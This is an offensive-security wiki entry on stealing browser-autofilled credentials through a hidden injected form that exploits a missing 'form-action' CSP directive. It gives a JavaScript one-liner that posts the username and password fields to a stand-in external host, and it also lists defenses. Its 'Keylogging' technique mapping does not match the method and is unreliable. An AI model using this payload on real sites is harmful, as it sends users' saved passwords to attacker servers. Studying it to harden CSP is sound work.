---
tags:
  - csp-misconfiguration
  - credential-theft
  - form-injection
type: procedure
tools:
  - '[[tools/Browser-Developer-Tools]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/inject-malicious-form]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Keylogging]]'
updated_at: '2025-12-14T17:30:07.585Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: edc6e018-e0cb-45ea-870e-59dc3f75bf20
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Keylogging]]'
---
# Inject-Form-for-Credential-Submission

## Summary

This procedure injects a hidden form with an arbitrary external action, leveraging browser autofill to capture and submit saved credentials, exploiting the absence of a 'form-action' CSP directive.

## Description

Without 'form-action' in CSP, forms default to 'default-src' allowances, permitting submissions to any domain. Injecting a form with hidden username/password fields triggers autofill from the password manager, sending credentials to attacker-controlled servers. Targets sites with user-saved logins and HTML injection vectors.

## Requirements

1. Saved credentials for the domain
2. HTML injection via console
3. Missing or permissive form-action CSP

## Defense

Defensive measures and detection strategies:

- Add 'form-action self' to CSP headers
- Sanitize injected HTML to block form creation
- Log and alert on form submissions to external domains
- Warn users against saving credentials on public sites

## Objectives

1. Inject form without CSP block
2. Trigger autofill of credentials
3. Exfiltrate data to external endpoint

## Instructions

### Step 1: Inject the Malicious Form

**Context**: Use console to insert the form HTML into the page.

**Command** ([[commands/inject-malicious-form]]):
```javascript
document.getElementsByTagName("div")[0].innerHTML=`<form action="//example.com"><input hidden name=user><input hidden type=password name=password><input type=submit></form>`
```

> This sets innerHTML to a form posting to example.com with hidden fields. Expected output: Form rendered, fields hidden.

### Step 2: Submit the Form

**Context**: Interact to trigger submission and autofill.

**Instructions**: Click the submit input button.

> Expected output: POST request to //example.com with autofilled user/password parameters.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Keylogging]]

### Sub-Techniques


## Commands Used

- [[commands/inject-malicious-form]]

## Tools Used

- [[tools/Browser-Developer-Tools]]

## Tags

- [[csp-misconfiguration]]
- [[credential-theft]]
- [[form-injection]]
